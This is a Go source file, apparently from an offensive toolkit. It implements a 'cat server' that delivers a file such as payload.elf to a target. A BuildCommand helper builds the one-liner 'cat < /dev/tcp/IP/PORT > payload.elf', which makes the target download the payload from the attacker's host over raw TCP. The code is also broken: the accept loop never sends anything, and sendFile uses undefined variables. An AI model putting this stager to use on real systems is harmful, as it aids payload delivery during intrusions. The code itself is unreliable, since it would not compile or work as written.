package cat

import (
	"fmt"
	"net"
	"sync"

	"github.com/pkg/errors"

	"project/internal/firewall"
	"project/internal/logger"
	"project/internal/nettool"
	"project/internal/xpanic"
)

// BuildCommand is used to build command that client will run.
// Example: "cat < /dev/tcp/1.1.1.1/443 > payload.elf"
func BuildCommand(ip, port, path string) string {
	return fmt.Sprintf("cat < /dev/tcp/%s/%s > %s", ip, port, path)
}

// Server is the cat server to send file.
type Server struct {
	file   []byte
	logger logger.Logger

	exitOnSend bool
	listener   net.Listener

	wg sync.WaitGroup
}

// Options contain options about cat server.
type Options struct {
	// close Server when send file successfully
	ExitOnSend bool `json:"exit_on_send"`

	// only allow this IP to connect server
	RemoteHost string `json:"remote_host"`

	// maximum income connections
	MaxConns int `json:"max_conns"`

	// about firewall listener
	OnBlockedConn func(conn net.Conn) `json:"-"`
}

// NewServer is used to create a new cat server.
func NewServer(network, address string, file []byte, logger logger.Logger, opts *Options) (*Server, error) {
	if len(file) == 0 {
		return nil, errors.New("empty file data")
	}
	rawListener, err := net.Listen(network, address)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	if opts == nil {
		opts = new(Options)
	}
	listenerOpts := firewall.ListenerOptions{
		FilterMode:    firewall.FilterModeDefault,
		MaxConnsTotal: opts.MaxConns,
		OnBlockedConn: opts.OnBlockedConn,
	}
	if opts.RemoteHost != "" {
		listenerOpts.FilterMode = firewall.FilterModeAllow
	}
	listener, err := firewall.NewListener(rawListener, &listenerOpts)
	if err != nil {
		panic(fmt.Sprintf("cat server internal error: %s", err))
	}
	if opts.RemoteHost != "" {
		listener.AddAllowedHost(opts.RemoteHost)
	}
	if listener.GetMaxConnsTotal() < 1 {
		listener.SetMaxConnsTotal(256)
	}
	srv := Server{
		file:       file,
		logger:     logger,
		exitOnSend: opts.ExitOnSend,
		listener:   listener,
	}
	return &srv, nil
}

// Start is used to start cat server.
func (srv *Server) Start() {
	srv.wg.Add(1)
	go srv.serve()
}

func (srv *Server) logf(lv logger.Level, format string, log ...interface{}) {
	srv.logger.Printf(lv, "cat server", format, log...)
}

func (srv *Server) log(lv logger.Level, log ...interface{}) {
	srv.logger.Println(lv, "cat server", log...)
}

func (srv *Server) serve() {
	defer func() {
		if r := recover(); r != nil {
			srv.log(logger.Fatal, xpanic.Print(r, "Server.serve"))
		}
	}()
	address := srv.listener.Addr()
	network := address.Network()
	srv.logf(logger.Info, "serve over listener (%s %s)", network, address)
	defer srv.logf(logger.Info, "listener closed (%s %s)", network, address)
	for {
		conn, err := srv.listener.Accept()
		if err == nil {
			continue
		}

	}
}

func (srv *Server) sendFile(conn net.Conn) {
	defer func() {
		err := conn.Close()
		if err != nil {
			srv.log(logger.Error, "failed to close connection:", err)
		}
	}()
	info := nettool.PrintConn(conn)

	logger.Common.Println(logger.Info, logSrc, "income connection", info)
	_, err := conn.Write(data)
	if err != nil {
		logger.Common.Printf(logger.Error, logSrc, "failed to send file: %s\n%s", err, info)
	}
}
